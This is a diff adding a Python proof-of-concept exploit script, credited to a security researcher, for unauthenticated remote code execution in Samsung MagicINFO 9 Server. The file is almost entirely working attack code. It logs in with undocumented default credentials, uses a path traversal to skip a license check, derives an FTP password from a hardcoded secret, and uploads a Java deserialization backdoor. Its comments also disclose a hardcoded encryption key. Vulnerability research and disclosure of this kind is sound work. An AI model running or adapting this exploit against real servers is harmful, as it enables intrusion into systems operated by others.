@@ -1,0 +1,224 @@
+#!/usr/bin/env python3
+"""
+Samsung MagicINFO 9 Server ResponseBootstrappingActivity Exposed Dangerous Method Remote Code Execution Vulnerability
+Download: https://www.magicinfoservices.com/magicinfo-software?submissionGuid=4163dba5-9096-43b4-9ca0-27696e8b70b8
+File: MagicInfo 9 Server 21.1080.0 Setup.zip
+Release date: 5/8/2025
+SHA1: 9744711fe76e7531f128835bf83c9ae001069115
+Install guide: https://docs.samsungvx.com/docs/pages/viewpage.action?pageId=60034270
+Found by: Steven Seeley of Source Incite
+
+## Proof of Concept
+
+```
+steven@DESKTOP-DHOMH1S:~$ ./poc.py
+(+) usage: ./poc.py <target>
+(+) eg: ./poc.py 192.168.18.136
+
+steven@DESKTOP-DHOMH1S:~$ ./poc.py 192.168.18.136
+(+) running the attack...
+(+) stage 1 - added an activation code: 2612539
+(+) stage 2 - registered a unique code: givPXiEbpFGp0PwGRC3M
+(+) stage 3 - created the ftp account Xn-WG-Rq-5x-HW-Vl:05b574474312b0c6
+(+) stage 4 - provisioned ftp account, you may now login!
+(+) stage 5 - uploaded backdoor, wait for a server restart for a mspaint pop!
+```
+"""
+import sys
+import string
+import random
+import requests
+import urllib3
+from ftplib import FTP
+from hashlib import sha512
+import xml.etree.ElementTree as ET
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+def genRandStr(length):
+    characters = string.ascii_letters + string.digits
+    random_string = ''.join(random.choice(characters) for i in range(length))
+    return random_string
+
+def createFTPAccount(t, usr, device_code):
+    xml = f"""<?xml version="1.0" encoding="UTF-8" standalone="yes" ?>
+<env:Envelope xmlns:env="http://www.w3.org/2003/05/soap-envelope" xmlns:oper="http://www.samsung.com/wsrm/operationMsg">
+    <env:Header xmlns:addr="http://schemas.xmlsoap.org/ws/2004/08/addressing">
+        <addr:Action>http://samsung.com/sec/ws/2005/05/rm/Server/Command</addr:Action>
+        <addr:MessageID>1</addr:MessageID>
+        <addr:RelatesTo>2</addr:RelatesTo>
+        <addr:To>https://srcincite.io/</addr:To>
+        <addr:From>
+            <addr:Address>https://srcincite.io/</addr:Address>
+        </addr:From>
+        <addr:ReplyTo>
+            <addr:Address>https://srcincite.io/</addr:Address>
+        </addr:ReplyTo>
+        <wsse:Security xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd">
+            <wsse:UsernameToken>
+                <wsse:Username>{usr}</wsse:Username>
+            </wsse:UsernameToken>
+        </wsse:Security>
+    </env:Header>
+    <env:Body>
+        <oper:COMMAND>
+            <oper:REPORT_INDICATE>false</oper:REPORT_INDICATE>
+            <oper:COMMAND_ID>rce</oper:COMMAND_ID>
+            <oper:MO_CMD>.MO.MONITOR_OPERATION.BOOTSTRAP</oper:MO_CMD>
+            <oper:MO_BASEPATH>.MO.MONITOR_OPERATION.BOOTSTRAP</oper:MO_BASEPATH>
+            <oper:MO_SEQUENCE>
+                <oper:MO>
+                    <oper:MO_PATH>DEV_CODE</oper:MO_PATH>
+                    <oper:MO_VALUE>si</oper:MO_VALUE>
+                </oper:MO>
+                <oper:MO>
+                    <oper:MO_PATH>DEV_MDNM</oper:MO_PATH>
+                    <oper:MO_VALUE>si</oper:MO_VALUE>
+                </oper:MO>
+                <oper:MO>
+                    <oper:MO_PATH>DEV_TYPE</oper:MO_PATH>
+                    <oper:MO_VALUE>si</oper:MO_VALUE>
+                </oper:MO>
+                <oper:MO>
+                    <oper:MO_PATH>DEV_PORT</oper:MO_PATH>
+                    <oper:MO_VALUE>1337</oper:MO_VALUE>
+                </oper:MO>
+                <oper:MO>
+                    <oper:MO_PATH>CPU_TYPE</oper:MO_PATH>
+                    <oper:MO_VALUE>1;33;7</oper:MO_VALUE>
+                </oper:MO>
+            </oper:MO_SEQUENCE>
+        </oper:COMMAND>
+    </env:Body>
+</env:Envelope>"""
+    h = {
+        "content-type":"application/soap+xml"
+    }
+    r = requests.post(f"https://{t}:7002/MagicInfo/WSRMService", headers=h, data=xml, verify=False)
+    assert r.status_code == 200, "(+) ftp account creation failed!"
+    root = ET.fromstring(r.content)
+    ns = { "srm": "http://www.samsung.com/wsrm/operationMsg" }
+    timestamp = str.encode(root.find('.//srm:MO_VALUE', ns).text)
+    assert timestamp, "(-) failed to find the timestamp"
+    # select encode(SECRET_VALUE::bytea, 'hex') from mi_system_info_setup where organization_id=0
+    # returns 01161a021413121103
+    # This value is inserted upon install
+    m = sha512()
+    m.update(timestamp + str.encode(usr) + bytes.fromhex("01161a021413121103") + bytes(device_code, "utf-8")) # yes default keys are still a problem for this product
+    return (m.hexdigest().upper()[0:16].lower())
+
+def provisionFTP(t, username, code):
+    xml = f"""<?xml version="1.0" encoding="UTF-8" standalone="yes" ?>
+<env:Envelope xmlns:env="http://www.w3.org/2003/05/soap-envelope" xmlns:oper="http://www.samsung.com/wsrm/operationMsg">
+    <env:Header xmlns:addr="http://schemas.xmlsoap.org/ws/2004/08/addressing">
+        <addr:Action>http://samsung.com/sec/ws/2005/05/rm/Server/Notify</addr:Action>
+        <addr:MessageID>1337</addr:MessageID>
+        <addr:RelatesTo></addr:RelatesTo>
+        <addr:To>https://srcincite.io/</addr:To>
+        <addr:From>
+            <addr:Address>https://srcincite.io/</addr:Address>
+        </addr:From>
+        <addr:ReplyTo>
+            <addr:Address>https://srcincite.io/</addr:Address>
+        </addr:ReplyTo>
+        <wsse:Security xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd">
+            <wsse:UsernameToken>
+                <wsse:Username>{username}</wsse:Username>
+            </wsse:UsernameToken>
+        </wsse:Security>
+    </env:Header>
+    <env:Body>
+       <oper:NOTIFY>
+        <oper:MO_EVENT>.MO.MONITORING_INFO.ACTIVATION</oper:MO_EVENT>
+         <oper:EVENT_ID>1337</oper:EVENT_ID>
+         <oper:EVENT_NAME>si</oper:EVENT_NAME>
+         <oper:EVENT_STATE>On</oper:EVENT_STATE>
+         <oper:EVENT_DATE>2025-01-02T05:45:01</oper:EVENT_DATE>
+         <oper:MO_SEQUENCE>
+            <oper:MO>
+               <oper:MO_PATH>.MO.MONITORING_INFO.ACTIVATION.ACTIVATION_CODE</oper:MO_PATH>
+               <oper:MO_VALUE>
+                 {code}
+               </oper:MO_VALUE>
+            </oper:MO>
+         </oper:MO_SEQUENCE>
+      </oper:NOTIFY>
+    </env:Body>
+</env:Envelope>"""
+    h = {
+        "content-type":"application/soap+xml"
+    }
+    r = requests.post(f"https://{t}:7002/MagicInfo/WSRMService", headers=h, data=xml, verify=False)
+    assert r.status_code == 200, "(-) failed to provision the ftp account!"
+    root = ET.fromstring(r.content)
+    ns = { "srm": "http://www.samsung.com/wsrm/operationMsg" }
+    assert root.find('.//srm:RESULT', ns).text == "SUCCESS", "(-) unsuccessful in provisioning ftp account!"
+
+def uploadDeserializationGadget(target, usr, pwd):
+    session = FTP(target, usr, pwd)
+    # poc.bin is `java -jar ~/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 mspaint` using commons-beanutils-1.9.3 and commons-collections-3.2
+    file = open('poc.bin','rb')
+    # vector for RCE but must wait for a restart...
+    session.storbinary('STOR /mofiles/Default/Default_MO_TREE.BIN', file)
+    file.close()
+    session.quit()
+
+def registerUniqueCode(t, dev_id):
+    # stored in the database AES256 encrypted using the hardcoded key: tQeU1f3jnnk79Ea1dr+RJtAO0yoW06HO
+    # which is stored in config.properties as encrypt.manager.key
+    # here we use a traversal to bypass the demo license check!
+    device_code = genRandStr(20)
+    requests.post(f"https://{t}:7002/MagicInfo/restapi/v2.0/auth/%2e%2e/rms/devices/{dev_id}/init", json={
+        "data": device_code
+    }, verify=False)
+    return device_code
+
+def addActivationInfo(t):
+    uri = f"https://{t}:7002/MagicInfoWebAuthorClient/main"
+    # undocumented default creds
+    # whoops they forgot the otp here
+    r = requests.post(uri, params={
+        "username" : "orgadmin",
+        "password" : "orgadmin2016"
+    }, 
+    headers={
+        "accept" : "application/json"
+    },
+    verify=False)
+    assert r.status_code == 200, "(-) login creds failed!"
+    uri = f"https://{t}:7002/MagicInfo/openapi/open"
+    r = requests.post(uri, params={
+        "service" : "CommonSettingService.addActivationInfo",
+        "organ_id": 1,
+        "expired_date_str": "2222-01-01", # well into the future!
+        "token": r.json()['token']
+    }, verify=False)
+    assert r.status_code == 200, "(-) activation code creation failed!"
+    root = ET.fromstring(r.content)
+    return root.find('responseClass').text
+
+def main():
+    if len(sys.argv) != 2:
+        print(f"(+) usage: {sys.argv[0]} <target>")
+        print(f"(+) eg: {sys.argv[0]} 192.168.18.136")
+        sys.exit(1)
+    t = sys.argv[1]
+    user_id = f"{genRandStr(2)}-{genRandStr(2)}-{genRandStr(2)}-{genRandStr(2)}-{genRandStr(2)}-{genRandStr(2)}"
+    print("(+) running the attack...")
+    # this is stage 1 because it's the spot where the attack will most likley fail.
+    # 1. needs saas.ac.enable = true in config.properties
+    # 2. needs a valid admin account. Here we use the built in account orgadmin that is likely left unchecked due to:
+    #    a) an admin account already exists which will likley be used by the admins
+    #    b) no documentation mentioning the orgadmin account
+    acode = addActivationInfo(t)
+    print(f"(+) stage 1 - added an activation code: {acode}")
+    device_code = registerUniqueCode(t, user_id)
+    print(f"(+) stage 2 - registered a unique code: {device_code}")
+    pwd = createFTPAccount(t, user_id, device_code)
+    print(f"(+) stage 3 - created the ftp account {user_id}:{pwd}")
+    provisionFTP(t, user_id, acode)
+    print("(+) stage 4 - provisioned ftp account, you may now login!")
+    uploadDeserializationGadget(t, user_id, pwd)
+    print("(+) stage 5 - uploaded backdoor, wait for a server restart for a mspaint pop!")
+
+if __name__ == '__main__':
+    main()
